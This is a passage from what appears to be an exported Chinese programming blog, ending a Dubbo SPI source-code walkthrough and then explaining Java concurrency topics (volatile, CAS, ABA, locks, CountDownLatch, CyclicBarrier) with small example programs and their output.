(T) EXTENSION_INSTANCES.get(clazz); } // 自动装配扩展实现对象中的属性（即调用其 setter）。这里涉及 ExtensionFactory 以及自动装配的相关内容。 injectExtension(instance); // ---&gt; // 自动包装扩展实现对象。这里涉及 Wrapper 类以及自动包装特性的相关内容。 Set&lt;Class&lt;?&gt;&gt; wrapperClasses = cachedWrapperClasses; if (CollectionUtils.isNotEmpty(wrapperClasses)) { // 遍历所有的包装类，包装类需要有一个参数类被包装类型的构造器。 for (Class&lt;?&gt; wrapperClass : wrapperClasses) { instance = injectExtension((T) wrapperClass.getConstructor(type).newInstance(instance)); } } // 如果扩展实现类实现了 Lifecycle 接口，在 initExtension() 方法中会调用 initialize() 方法进行初始化。 initExtension(instance); return instance; } catch (Throwable t) { throw new IllegalStateException(&quot;Extension instance (name: &quot; + name + &quot;, class: &quot; + type + &quot;) couldn't be instantiated: &quot; + t.getMessage(), t); }} ExtensionLoader#injectExtension private T injectExtension(T instance) { if (objectFactory == null) { return instance; } try { for (Method method : instance.getClass().getMethods()) { // 判断是否为set方法 if (!isSetter(method)) { continue; } // 如果有 @DisableInject 注解也不注入 if (method.getAnnotation(DisableInject.class) != null) { continue; } // 获取参数类型，如果是基本类型也忽略 Class&lt;?&gt; pt = method.getParameterTypes()[0]; if (ReflectUtils.isPrimitives(pt)) { continue; } try { // 根据 Setter 方法获取属性名 String property = getSetterProperty(method); // 加载这个类，并实例化 Object object = objectFactory.getExtension(pt, property); if (object != null) { // 反射注入 method.invoke(instance, object); } } catch (Exception e) { logger.error(&quot;Failed to inject via method &quot; + method.getName() + &quot; of interface &quot; + type.getName() + &quot;: &quot; + e.getMessage(), e); } } } catch (Exception e) { logger.error(e.getMessage(), e); } return instance;} Dubbo SPI 的 @Adaptive 注解与适配器在dubbo扩展中，适配器模式被广泛使用，其作用在于为同一扩展类型下的多个扩展实现的调用提供路由功能，如指定优先级等。dubbo提供了两种方式来生成扩展适配器： 静态代码形式的默认适配器：这些类会被Adaptive注解修饰，且一个接口只能有一个这样的静态适配器。这种形式仅应用于一些特殊的接口，如：AdaptiveCompiler、AdaptiveExtensionFactory这两个适配器，ExtensionLoader需要依赖它们来工作，所以使用了这种特殊的构建方式。 动态代码适配器：实际上其余的接口都是使用动态适配器，ExtensionLoader 根据接口定义动态生成一段适配器代码，并构建这个动态类的实例。这个时候接口中的一些方法具有 Adaptive 标记，它提供了一些用于查找具体 Extension 的key，如果这些方法中有URL类型的参数，则会依次在url中查找这些key对应的value，再以此为 name 确定要使用的 Extension。如果没有从url中找到该参数，则会使用 SPI 注解中的默认值 name 进行构建。 我们回到构造方法中ExtensionLoader#getAdaptiveExtension private ExtensionLoader(Class&lt;?&gt; type) { this.type = type; // 初始化拓展适配器 objectFactory = (type == ExtensionFactory.class ? null : ExtensionLoader.getExtensionLoader(ExtensionFactory.class).getAdaptiveExtension());} ExtensionLoader#getAdaptiveExtension public T getAdaptiveExtension() { // 先从缓存中获取 Object instance = cachedAdaptiveInstance.get(); if (instance == null) { if (createAdaptiveInstanceError != null) { throw new IllegalStateException(&quot;Failed to create adaptive instance: &quot; + createAdaptiveInstanceError.toString(), createAdaptiveInstanceError); } synchronized (cachedAdaptiveInstance) { instance = cachedAdaptiveInstance.get(); if (instance == null) { try { // 创建 instance = createAdaptiveExtension(); // ---&gt; 1 cachedAdaptiveInstance.set(instance); } catch (Throwable t) { createAdaptiveInstanceError = t; throw new IllegalStateException(&quot;Failed to create adaptive instance: &quot; + t.toString(), t); } } } } return (T) instance;}private T createAdaptiveExtension() { try { // 注入属性 return injectExtension((T) getAdaptiveExtensionClass().newInstance()); // ---&gt; 2 } catch (Exception e) { throw new IllegalStateException(&quot;Can't create adaptive extension &quot; + type + &quot;, cause: &quot; + e.getMessage(), e); }}private Class&lt;?&gt; getAdaptiveExtensionClass() { getExtensionClasses(); if (cachedAdaptiveClass != null) { return cachedAdaptiveClass; } return cachedAdaptiveClass = createAdaptiveExtensionClass(); // ---&gt; 3}private Class&lt;?&gt; createAdaptiveExtensionClass() { // 创建适配器类，并继承 type 接口 String code = new AdaptiveClassCodeGenerator(type, cachedDefaultName).generate(); // ---&gt; 4 ClassLoader classLoader = findClassLoader(); // ExtensionLoader再调用默认的JavassitCompiler进行编译和类加载 org.apache.dubbo.common.compiler.Compiler compiler = ExtensionLoader.getExtensionLoader(org.apache.dubbo.common.compiler.Compiler.class).getAdaptiveExtension(); return compiler.compile(code, classLoader);} ExtensionLoader#createAdaptiveExtensionClass 以 Transsporter为例子 @SPI(&quot;netty&quot;) public interface Transporter { @Adaptive({Constants.SERVER_KEY, Constants.TRANSPORTER_KEY}) RemotingServer bind(URL url, ChannelHandler handler) throws RemotingException; @Adaptive({Constants.CLIENT_KEY, Constants.TRANSPORTER_KEY}) Client connect(URL url, ChannelHandler handler) throws RemotingException; } Dubbo 会生成一个 Transporter$Adaptive 适配器类，该类继承了 Transporter 接口： public class Transporter$Adaptive implements Transporter { public org.apache.dubbo.remoting.Client connect(URL arg0, ChannelHandler arg1) throws RemotingException { // 必须传递URL参数 if (arg0 == null) throw new IllegalArgumentException(&quot;url == null&quot;); URL url = arg0; // 确定扩展名，优先从URL中的client参数获取，其次是transporter参数 // 这两个参数名称由@Adaptive注解指定，最后是@SPI注解中的默认值 String extName = url.getParameter(&quot;client&quot;, url.getParameter(&quot;transporter&quot;, &quot;netty&quot;)); if (extName == null) throw new IllegalStateException(&quot;...&quot;); // 通过ExtensionLoader加载Transporter接口的指定扩展实现 Transporter extension = (Transporter) ExtensionLoader .getExtensionLoader(Transporter.class) .getExtension(extName); return extension.connect(arg0, arg1); } ... // 省略bind()方法 } Dubbo SPI 的 @Activate注解与自动激活特性这里以 Dubbo 中的 Filter 为例说明自动激活特性的含义，org.apache.dubbo.rpc.Filter 接口有非常多的扩展实现类，在一个场景中可能需要某几个 Filter 扩展实现类协同工作，而另一个场景中可能需要另外几个实现类一起工作。这样，就需要一套配置来指定当前场景中哪些 Filter 实现是可用的，这就是 @Activate 注解要做的事情。 @Activate 注解标注在扩展实现类上，有 group、value 以及 order 三个属性。 group 属性：修饰的实现类是在 Provider 端被激活还是在 Consumer 端被激活。 value 属性：修饰的实现类只在 URL 参数中出现指定的 key 时才会被激活。 order 属性：用来确定扩展实现类的排序。 如 Filter 接口和实现类： @SPIpublic interface Filter { Result invoke(Invoker&lt;?&gt; invoker, Invocation invocation) throws RpcException;1}@Activate(group = Constants.PROVIDER)public class TimeoutFilter implements Filter { ...}@Activate(group = {Constants.PROVIDER, Constants.CONSUMER})public class MonitorFilter implements Filter { ...} 首先来关注 getActivateExtension() 方法的参数：url 中包含了配置信息，values 是配置中指定的扩展名，group 为 Provider 或 Consumer。 public List&lt;T&gt; getActivateExtension(URL url, String[] values, String group) { List&lt;T&gt; activateExtensions = new ArrayList&lt;&gt;(); // values配置就是扩展名 List&lt;String&gt; names = values == null ? new ArrayList&lt;&gt;(0) : asList(values); if (!names.contains(REMOVE_VALUE_PREFIX + DEFAULT_KEY)) {// ---1 getExtensionClasses(); // 触发cachedActivates等缓存字段的加载 for (Map.Entry&lt;String, Object&gt; entry : cachedActivates.entrySet()) { String name = entry.getKey(); // 扩展名 Object activate = entry.getValue(); // @Activate注解 String[] activateGroup, activateValue; if (activate instanceof Activate) { // @Activate注解中的配置 activateGroup = ((Activate) activate).group(); activateValue = ((Activate) activate).value(); } else { continue; } if (isMatchGroup(group, activateGroup) // 匹配group // 没有出现在values配置中的，即为默认激活的扩展实现 &amp;&amp; !names.contains(name) // 通过&quot;-&quot;明确指定不激活该扩展实现 &amp;&amp; !names.contains(REMOVE_VALUE_PREFIX + name) // 检测URL中是否出现了指定的Key &amp;&amp; isActive(activateValue, url)) { // 加载扩展实现的实例对象，这些都是激活的 activateExtensions.add(getExtension(name)); } } // 排序 --- 2 activateExtensions.sort(ActivateComparator.COMPARATOR); } List&lt;T&gt; loadedExtensions = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; names.size(); i++) { // ---3 String name = names.get(i); // 通过&quot;-&quot;开头的配置明确指定不激活的扩展实现，直接就忽略了 if (!name.startsWith(REMOVE_VALUE_PREFIX) &amp;&amp; !names.contains(REMOVE_VALUE_PREFIX + name)) { if (DEFAULT_KEY.equals(name)) { if (!loadedExtensions.isEmpty()) { // 按照顺序，将自定义的扩展添加到默认扩展集合前面 activateExtensions.addAll(0, loadedExtensions); loadedExtensions.clear(); } } else { loadedExtensions.add(getExtension(name)); } } } if (!loadedExtensions.isEmpty()) { // 按照顺序，将自定义的扩展添加到默认扩展集合后面 activateExtensions.addAll(loadedExtensions); } return activateExtensions; } 总结本文总结了 JDK SPI 和 Dubbo SPI 机制和原理，参考了很多文章，以下几点需要值得注意： JDK SPI 需要对加载实例化所有的推展对象，而 Dubbo SPI 根据 KV 形式，只需要实例化需要的拓展。 Dubbo SPI 对 JDK SPI 拓展了自动注入、自动注入以及自动激活等特性。 参考 Dubbo官网-Dubbo SPI Dubbo SPI 精析 Dubbo源码解读全集 聊聊Dubbo（五）：核心源码-SPI扩展 Dubbo源码分析（五）ExtensionLoader","link":"/2020/08/26/Dubbo_SPI%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"title":"Java 并发编程","text":"请谈谈你对 volatile 的理解volatile 是 Java 虚拟机提供的轻量级的同步机制 保证可见性 禁止指令排序 不保证原子性 JMM（Java 内存模型） JMM 本身是一种抽象的概念并不是真实存在，它描述的是一组规定或则规范，通过这组规范定义了程序中的访问方式。 JMM 同步规定 线程解锁前，必须把共享变量的值刷新回主内存 线程加锁前，必须读取主内存的最新值到自己的工作内存 加锁解锁是同一把锁 由于 JVM 运行程序的实体是线程，而每个线程创建时 JVM 都会为其创建一个工作内存，工作内存是每个线程的私有数据区域，而 Java 内存模型中规定所有变量的储存在主内存，主内存是共享内存区域，所有的线程都可以访问，但线程对变量的操作（读取赋值等）必须都工作内存进行看。 首先要将变量从主内存拷贝的自己的工作内存空间，然后对变量进行操作，操作完成后再将变量写回主内存，不能直接操作主内存中的变量，工作内存中存储着主内存中的变量副本拷贝，前面说过，工作内存是每个线程的私有数据区域，因此不同的线程间无法访问对方的工作内存，线程间的通信(传值)必须通过主内存来完成。 内存模型图 三大特性： 可见性 原子性 有序性 （1）可见性，如果不加 volatile 关键字，则主线程会进入死循环，加 volatile 则主线程能够退出，说明加了 volatile 关键字变量，当有一个线程修改了值，会马上被另一个线程感知到，当前值作废，从新从主内存中获取值。对其他线程可见，这就叫可见性。 /** * @Author: cuzz * @Date: 2019/4/16 21:29 * @Description: 可见性代码实例 */public class VolatileDemo { public static void main(String[] args) { Data data = new Data(); new Thread(() -&gt; { System.out.println(Thread.currentThread().getName() + &quot; coming...&quot;); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } data.addOne(); // 调用 System.out.println(Thread.currentThread().getName() + &quot; updated...&quot;); }).start(); while (data.a == 0) { // looping } System.out.println(Thread.currentThread().getName() + &quot; job is done...&quot;); }}class Data { // int a = 0; volatile int a = 0; void addOne() { this.a += 1; }} （2）原子性，发现下面输出不能得到 20000。 public class VolatileDemo { public static void main(String[] args) { // test01(); test02(); } // 测试原子性 private static void test02() { Data data = new Data(); for (int i = 0; i &lt; 20; i++) { new Thread(() -&gt; { for (int j = 0; j &lt; 1000; j++) { data.addOne(); } }).start(); } // 默认有 main 线程和 gc 线程 while (Thread.activeCount() &gt; 2) { Thread.yield(); } System.out.println(data.a); }}class Data { volatile int a = 0; void addOne() { this.a += 1; }} （3）有序性 计算机在执行程序时，为了提高性能，编译器个处理器常常会对指令做重排，一般分为以下 3 种 编译器优化的重排 指令并行的重排 内存系统的重排 单线程环境里面确保程序最终执行的结果和代码执行的结果一致 处理器在进行重排序时必须考虑指令之间的数据依赖性 多线程环境中线程交替执行，由于编译器优化重排的存在，两个线程中使用的变量能否保证用的变量能否一致性是无法确定的，结果无法预测 代码示例 public class ReSortSeqDemo { int a = 0; boolean flag = false; public void method01() { a = 1; // flag = true; // ----线程切换---- flag = true; // a = 1; } public void method02() { if (flag) { a = a + 3; System.out.println(&quot;a = &quot; + a); } }} 如果两个线程同时执行，method01 和 method02 如果线程 1 执行 method01 重排序了，然后切换的线程 2 执行 method02 就会出现不一样的结果。 禁止指令排序 volatile 实现禁止指令重排序的优化，从而避免了多线程环境下程序出现乱序的现象 先了解一个概念，内存屏障（Memory Barrier）又称内存栅栏，是一个 CPU 指令，他的作用有两个： 保证特定操作的执行顺序 保证某些变量的内存可见性（利用该特性实现 volatile 的内存可见性） 由于编译器个处理器都能执行指令重排序优化，如果在指令间插入一条 Memory Barrier 则会告诉编译器和 CPU，不管什么指令都不能个这条 Memory Barrier 指令重排序，也就是说通过插入内存屏障禁止在内存屏障前后执行重排序优化。内存屏障另一个作用是强制刷出各种 CPU 缓存数据，因此任何 CPU 上的线程都能读取到这些数据的最新版本。 下面是保守策略下，volatile写插入内存屏障后生成的指令序列示意图： 下面是在保守策略下，volatile读插入内存屏障后生成的指令序列示意图： 线程安全性保证 工作内存与主内存同步延迟现象导致可见性问题 可以使用 synchronzied 或 volatile 关键字解决，它们可以使用一个线程修改后的变量立即对其他线程可见 对于指令重排导致可见性问题和有序性问题 可以利用 volatile 关键字解决，因为 volatile 的另一个作用就是禁止指令重排序优化 你在哪些地方用到过 volatile？单例 多线程环境下可能存在的安全问题，发现构造器里的内容会多次输出 @NotThreadSafepublic class Singleton01 { private static Singleton01 instance = null; private Singleton01() { System.out.println(Thread.currentThread().getName() + &quot; construction...&quot;); } public static Singleton01 getInstance() { if (instance == null) { instance = new Singleton01(); } return instance; } public static void main(String[] args) { ExecutorService executorService = Executors.newFixedThreadPool(10); for (int i = 0; i &lt; 10; i++) { executorService.execute(()-&gt; Singleton01.getInstance()); } executorService.shutdown(); }} 双重锁单例 public class Singleton02 { private static volatile Singleton02 instance = null; private Singleton02() { System.out.println(Thread.currentThread().getName() + &quot; construction...&quot;); } public static Singleton02 getInstance() { if (instance == null) { synchronized (Singleton01.class) { if (instance == null) { instance = new Singleton02(); } } } return instance; } public static void main(String[] args) { ExecutorService executorService = Executors.newFixedThreadPool(10); for (int i = 0; i &lt; 10; i++) { executorService.execute(()-&gt; Singleton02.getInstance()); } executorService.shutdown(); }} 如果没有加 volatile 就不一定是线程安全的，原因是指令重排序的存在，加入 volatile 可以禁止指令重排。原因是在于某一个线程执行到第一次检测，读取到的 instance 不为 null 时，instance 的引用对象可能还没有完成初始化。instance = new Singleton() 可以分为以下三步完成。 memory = allocate(); // 1.分配对象空间instance(memory); // 2.初始化对象instance = memory; // 3.设置instance指向刚分配的内存地址，此时instance != null 步骤 2 和步骤 3 不存在依赖关系，而且无论重排前还是重排后程序的执行结果在单线程中并没有改变，因此这种优化是允许的，发生重排。 memory = allocate(); // 1.分配对象空间instance = memory; // 3.设置instance指向刚分配的内存地址，此时instance != null，但对象还没有初始化完成instance(memory); // 2.初始化对象 所以不加 volatile 返回的实例不为空，但可能是未初始化的实例 CAS 你知道吗？CAS 底层原理？谈谈对 UnSafe 的理解？public class CASDemo { public static void main(String[] args) { AtomicInteger atomicInteger = new AtomicInteger(666); // 获取真实值，并替换为相应的值 boolean b = atomicInteger.compareAndSet(666, 2019); System.out.println(b); // true boolean b1 = atomicInteger.compareAndSet(666, 2020); System.out.println(b1); // false atomicInteger.getAndIncrement(); }} getAndIncrement()方法 /*** Atomically increments by one the current value.** @return the previous value*/public final int getAndIncrement() { return unsafe.getAndAddInt(this, valueOffset, 1);} 引出一个问题：UnSafe 类是什么？我们先看看AtomicInteger 就使用了Unsafe 类。 public class AtomicInteger extends Number implements java.io.Serializable { private static final long serialVersionUID = 6214790243416807050L; // setup to use Unsafe.compareAndSwapInt for updates private static final Unsafe unsafe = Unsafe.getUnsafe(); private static final long valueOffset; static { try { // 获取下面 value 的地址偏移量 valueOffset = unsafe.objectFieldOffset (AtomicInteger.class.getDeclaredField(&quot;value&quot;)); } catch (Exception ex) { throw new Error(ex); } } private volatile int value; // ...} Unsafe类： Unsafe 是 CAS 的核心类，由于 Java 方法无法直接访问底层系统，而需要通过本地（native）方法来访问， Unsafe 类相当一个后门，基于该类可以直接操作特定内存的数据。Unsafe 类存在于 sun.misc 包中，其内部方法操作可以像 C 指针一样直接操作内存，因为 Java 中 CAS 操作执行依赖于 Unsafe 类。 变量 vauleOffset，表示该变量值在内存中的偏移量，因为 Unsafe 就是根据内存偏移量来获取数据的。 变量 value 用 volatile 修饰，保证了多线程之间的内存可见性。 CAS 是什么？ CAS 的全称 Compare-And-Swap，它是一条 CPU 并发。 它的功能是判断内存某一个位置的值是否为预期，如果是则更改这个值，这个过程就是原子的。 CAS 并发原体现在 JAVA 语言中就是 sun.misc.Unsafe 类中的各个方法。调用 UnSafe 类中的 CAS 方法，JVM 会帮我们实现出 CAS 汇编指令。这是一种完全依赖硬件的功能，通过它实现了原子操作。由于 CAS 是一种系统源语，源语属于操作系统用语范畴，是由若干条指令组成，用于完成某一个功能的过程，并且原语的执行必须是连续的，在执行的过程中不允许被中断，也就是说 CAS 是一条原子指令，不会造成所谓的数据不一致的问题。 分析一下 getAndAddInt 这个方法 // unsafe.getAndAddIntpublic final int getAndAddInt(Object obj, long valueOffset, long expected, int val) { int temp; do { temp = this.getIntVolatile(obj, valueOffset); // 获取快照值 } while (!this.compareAndSwap(obj, valueOffset, temp, temp + val)); // 如果此时 temp 没有被修改，就能退出循环，否则重新获取 return temp;} CAS 的缺点？ 循环时间长开销很大 如果 CAS 失败，会一直尝试，如果 CAS 长时间一直不成功，可能会给 CPU 带来很大的开销（比如线程数很多，每次比较都是失败，就会一直循环），所以希望是线程数比较小的场景。 只能保证一个共享变量的原子操作 对于多个共享变量操作时，循环 CAS 就无法保证操作的原子性。 引出 ABA 问题 原子类 AtomicInteger 的 ABA 问题谈一谈？原子更新引用知道吗？原子引用 public class AtomicReferenceDemo { public static void main(String[] args) { User cuzz = new User(&quot;cuzz&quot;, 18); User faker = new User(&quot;faker&quot;, 20); AtomicReference&lt;User&gt; atomicReference = new AtomicReference&lt;&gt;(); atomicReference.set(cuzz); System.out.println(atomicReference.compareAndSet(cuzz, faker)); // true System.out.println(atomicReference.get()); // User(userName=faker, age=20) }} ABA 问题是怎么产生的 /** * @program: learn-demo * @description: ABA * @author: cuzz * @create: 2019-04-21 23:31 **/public class ABADemo { private static AtomicReference&lt;Integer&gt; atomicReference = new AtomicReference&lt;&gt;(100); public static void main(String[] args) { new Thread(() -&gt; { atomicReference.compareAndSet(100, 101); atomicReference.compareAndSet(101, 100); }).start(); new Thread(() -&gt; { // 保证上面线程先执行 try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } atomicReference.compareAndSet(100, 2019); System.out.println(atomicReference.get()); // 2019 }).start(); }} 当有一个值从 A 改为 B 又改为 A，这就是 ABA 问题。 时间戳原子引用 package com.cuzz.thread;import java.util.concurrent.atomic.AtomicReference;import java.util.concurrent.atomic.AtomicStampedReference;/** * @description: ABA * @author: cuzz * @create: 2019-04-21 23:31 **/public class ABADemo2 { private static AtomicStampedReference&lt;Integer&gt; atomicStampedReference = new AtomicStampedReference&lt;&gt;(100, 1); public static void main(String[] args) { new Thread(() -&gt; { int stamp = atomicStampedReference.getStamp(); System.out.println(Thread.currentThread().getName() + &quot; 的版本号为：&quot; + stamp); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } atomicStampedReference.compareAndSet(100, 101, atomicStampedReference.getStamp(), atomicStampedReference.getStamp() + 1 ); atomicStampedReference.compareAndSet(101, 100, atomicStampedReference.getStamp(), atomicStampedReference.getStamp() + 1 ); }).start(); new Thread(() -&gt; { int stamp = atomicStampedReference.getStamp(); System.out.println(Thread.currentThread().getName() + &quot; 的版本号为：&quot; + stamp); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } boolean b = atomicStampedReference.compareAndSet(100, 2019, stamp, stamp + 1); System.out.println(b); // false System.out.println(atomicStampedReference.getReference()); // 100 }).start(); }} 我们先保证两个线程的初始版本为一致，后面修改是由于版本不一样就会修改失败。 我们知道 ArrayList 是线程不安全，请编写一个不安全的案例并给出解决方案？故障现象 public class ContainerDemo { public static void main(String[] args) { List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); Random random = new Random(); for (int i = 0; i &lt; 100; i++) { new Thread(() -&gt; { list.add(random.nextInt(10)); System.out.println(list); }).start(); } }} 发现报 java.util.ConcurrentModificationException 导致原因 并发修改导致的异常 解决方案 new Vector(); Collections.synchronizedList(new ArrayList&lt;&gt;()); new CopyOnWriteArrayList&lt;&gt;(); 优化建议 在读多写少的时候推荐使用 CopeOnWriteArrayList 这个类 java 中锁你知道哪些？请手写一个自旋锁？1、公平和非公平锁 是什么 公平锁：是指多个线程按照申请的顺序来获取值 非公平锁：是值多个线程获取值的顺序并不是按照申请锁的顺序，有可能后申请的线程比先申请的线程优先获取锁，在高并发的情况下，可能会造成优先级翻转或者饥饿现象 两者区别 公平锁：在并发环境中，每一个线程在获取锁时会先查看此锁维护的等待队列，如果为空，或者当前线程是等待队列的第一个就占有锁，否者就会加入到等待队列中，以后会按照 FIFO 的规则获取锁 非公平锁：一上来就尝试占有锁，如果失败在进行排队 2、可重入锁和不可重入锁 是什么 可重入锁：指的是同一个线程外层函数获得锁之后，内层仍然能获取到该锁，在同一个线程在外层方法获取锁的时候，在进入内层方法或会自动获取该锁 不可重入锁： 所谓不可重入锁，即若当前线程执行某个方法已经获取了该锁，那么在方法中尝试再次获取锁时，就会获取不到被阻塞 代码实现 可重入锁 public class ReentrantLock { boolean isLocked = false; Thread lockedBy = null; int lockedCount = 0; public synchronized void lock() throws InterruptedException { Thread thread = Thread.currentThread(); while (isLocked &amp;&amp; lockedBy != thread) { wait(); } isLocked = true; lockedCount++; lockedBy = thread; } public synchronized void unlock() { if (Thread.currentThread() == lockedBy) { lockedCount--; if (lockedCount == 0) { isLocked = false; notify(); } } }} 测试 public class Count {// NotReentrantLock lock = new NotReentrantLock(); ReentrantLock lock = new ReentrantLock(); public void print() throws InterruptedException{ lock.lock(); doAdd(); lock.unlock(); } private void doAdd() throws InterruptedException { lock.lock(); // do something System.out.println(&quot;ReentrantLock&quot;); lock.unlock(); } public static void main(String[] args) throws InterruptedException { Count count = new Count(); count.print(); }} 发现可以输出 ReentrantLock，我们设计两个线程调用 print() 方法，第一个线程调用 print() 方法获取锁，进入 lock() 方法，由于初始 lockedBy 是 null，所以不会进入 while 而挂起当前线程，而是是增量 lockedCount 并记录 lockBy 为第一个线程。接着第一个线程进入 doAdd() 方法，由于同一进程，所以不会进入 while 而挂起，接着增量 lockedCount，当第二个线程尝试lock，由于 isLocked=true，所以他不会获取该锁，直到第一个线程调用两次 unlock() 将 lockCount 递减为0，才将标记为 isLocked 设置为 false。 不可重入锁 public class NotReentrantLock { private boolean isLocked = false; public synchronized void lock() throws InterruptedException { while (isLocked) { wait(); } isLocked = true; } public synchronized void unlock() { isLocked = false; notify(); }} 测试 public class Count { NotReentrantLock lock = new NotReentrantLock(); public void print() throws InterruptedException{ lock.lock(); doAdd(); lock.unlock(); } private void doAdd() throws InterruptedException { lock.lock(); // do something lock.unlock(); } public static void main(String[] args) throws InterruptedException { Count count = new Count(); count.print(); }} 当前线程执行print()方法首先获取lock，接下来执行doAdd()方法就无法执行doAdd()中的逻辑，必须先释放锁。这个例子很好的说明了不可重入锁。 synchronized 和 ReentrantLock 都是可重入锁 synchronzied public class SynchronziedDemo { private synchronized void print() { doAdd(); } private synchronized void doAdd() { System.out.println(&quot;doAdd...&quot;); } public static void main(String[] args) { SynchronziedDemo synchronziedDemo = new SynchronziedDemo(); synchronziedDemo.print(); // doAdd... }} 上面可以说明 synchronized 是可重入锁。 ReentrantLock public class ReentrantLockDemo { private Lock lock = new ReentrantLock(); private void print() { lock.lock(); doAdd(); lock.unlock(); } private void doAdd() { lock.lock(); lock.lock(); System.out.println(&quot;doAdd...&quot;); lock.unlock(); lock.unlock(); } public static void main(String[] args) { ReentrantLockDemo reentrantLockDemo = new ReentrantLockDemo(); reentrantLockDemo.print(); }} 上面例子可以说明 ReentrantLock 是可重入锁，而且在 #doAdd 方法中加两次锁和解两次锁也可以。 3、自旋锁 是指定尝试获取锁的线程不会立即堵塞，而是采用循环的方式去尝试获取锁，这样的好处是减少线程上线文切换的消耗，缺点就是循环会消耗 CPU。 手动实现自旋锁 public class SpinLock { private AtomicReference&lt;Thread&gt; atomicReference = new AtomicReference&lt;&gt;(); private void lock () { System.out.println(Thread.currentThread() + &quot; coming...&quot;); while (!atomicReference.compareAndSet(null, Thread.currentThread())) { // loop } } private void unlock() { Thread thread = Thread.currentThread(); atomicReference.compareAndSet(thread, null); System.out.println(thread + &quot; unlock...&quot;); } public static void main(String[] args) throws InterruptedException { SpinLock spinLock = new SpinLock(); new Thread(() -&gt; { spinLock.lock(); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(&quot;hahaha&quot;); spinLock.unlock(); }).start(); Thread.sleep(1); new Thread(() -&gt; { spinLock.lock(); System.out.println(&quot;hehehe&quot;); spinLock.unlock(); }).start(); }} 输出： Thread[Thread-0,5,main] coming...Thread[Thread-1,5,main] coming...hahahaThread[Thread-0,5,main] unlock...heheheThread[Thread-1,5,main] unlock... 获取锁的时候，如果原子引用为空就获取锁，不为空表示有人获取了锁，就循环等待。 4、独占锁（写锁）/共享锁（读锁） 是什么 独占锁：指该锁一次只能被一个线程持有 共享锁：该锁可以被多个线程持有 对于 ReentrantLock 和 synchronized 都是独占锁；对与 ReentrantReadWriteLock 其读锁是共享锁而写锁是独占锁。读锁的共享可保证并发读是非常高效的，读写、写读和写写的过程是互斥的。 读写锁例子 public class MyCache { private volatile Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); private ReentrantReadWriteLock lock = new ReentrantReadWriteLock(); WriteLock writeLock = lock.writeLock(); ReadLock readLock = lock.readLock(); public void put(String key, Object value) { try { writeLock.lock(); System.out.println(Thread.currentThread().getName() + &quot; 正在写入...&quot;); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } map.put(key, value); System.out.println(Thread.currentThread().getName() + &quot; 写入完成，写入结果是 &quot; + value); } finally { writeLock.unlock(); } } public void get(String key) { try { readLock.lock(); System.out.println(Thread.currentThread().getName() + &quot; 正在读...&quot;); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } Object res = map.get(key); System.out.println(Thread.currentThread().getName() + &quot; 读取完成，读取结果是 &quot; + res); } finally { readLock.unlock(); } }} 测试 public class ReadWriteLockDemo { public static void main(String[] args) { MyCache cache = new MyCache(); for (int i = 0; i &lt; 5; i++) { final int temp = i; new Thread(() -&gt; { cache.put(temp + &quot;&quot;, temp + &quot;&quot;); }).start(); } for (int i = 0; i &lt; 5; i++) { final int temp = i; new Thread(() -&gt; { cache.get(temp + &quot;&quot;); }).start(); } }} 输出结果 Thread-0 正在写入...Thread-0 写入完成，写入结果是 0Thread-1 正在写入...Thread-1 写入完成，写入结果是 1Thread-2 正在写入...Thread-2 写入完成，写入结果是 2Thread-3 正在写入...Thread-3 写入完成，写入结果是 3Thread-4 正在写入...Thread-4 写入完成，写入结果是 4Thread-5 正在读...Thread-7 正在读...Thread-8 正在读...Thread-6 正在读...Thread-9 正在读...Thread-5 读取完成，读取结果是 0Thread-7 读取完成，读取结果是 2Thread-8 读取完成，读取结果是 3Thread-6 读取完成，读取结果是 1Thread-9 读取完成，读取结果是 4 能保证读写、写读和写写的过程是互斥的时候是独享的，读读的时候是共享的。 CountDownLatch、CyclicBarrier 和Semaphore 使用过吗？1、CountDownLatch 让一些线程堵塞直到另一个线程完成一系列操作后才被唤醒。CountDownLatch 主要有两个方法，当一个或多个线程调用 await 方法时，调用线程会被堵塞，其他线程调用 countDown 方法会将计数减一（调用 countDown 方法的线程不会堵塞），当计数其值变为零时，因调用 await 方法被堵塞的线程会被唤醒，继续执行。 假设我们有这么一个场景，教室里有班长和其他6个人在教室上自习，怎么保证班长等其他6个人都走出教室在把教室门给关掉。 public class CountDownLanchDemo { public static void main(String[] args) { for (int i = 0; i &lt; 6; i++) { new Thread(() -&gt; { System.out.println(Thread.currentThread().getName() + &quot; 离开了教室...&quot;); }, String.valueOf(i)).start(); } System.out.println(&quot;班长把门给关了，离开了教室...&quot;); }} 此时输出 0 离开了教室...1 离开了教室...2 离开了教室...3 离开了教室...班长把门给关了，离开了教室...5 离开了教室...4 离开了教室... 发现班长都没有等其他人理他教室就把门给关了，此时我们就可以使用 CountDownLatch 来控制 public class CountDownLanchDemo { public static void main(String[] args) throws InterruptedException { CountDownLatch countDownLatch = new CountDownLatch(6); for (int i = 0; i &lt; 6; i++) { new Thread(() -&gt; { countDownLatch.countDown(); System.out.println(Thread.currentThread().getName() + &quot; 离开了教室...&quot;); }, String.valueOf(i)).start(); } countDownLatch.await(); System.out.println(&quot;班长把门给关了，离开了教室...&quot;); }} 此时输出 0 离开了教室...1 离开了教室...2 离开了教室...3 离开了教室...4 离开了教室...5 离开了教室...班长把门给关了，离开了教室... 2、CyclicBarrier 我们假设有这么一个场景，每辆车只能坐个人，当车满了，就发车。 public class CyclicBarrierDemo { public static void main(String[] args) { CyclicBarrier cyclicBarrier = new CyclicBarrier(4, () -&gt; { System.out.println(&quot;车满了，开始出发...&quot;); }); for (int i = 0; i &lt; 8; i++) { new Thread(() -&gt; { System.out.println(Thread.currentThread().getName() + &quot; 开始上车...&quot;); try { cyclicBarrier.await(); } catch (InterruptedException e) { e.printStackTrace(); } catch (BrokenBarrierException e) { e.printStackTrace(); } }).start(); } }} 输出结果 Thread-0 开始上车...Thread-1 开始上车...Thread-3 开始上车...Thread-4 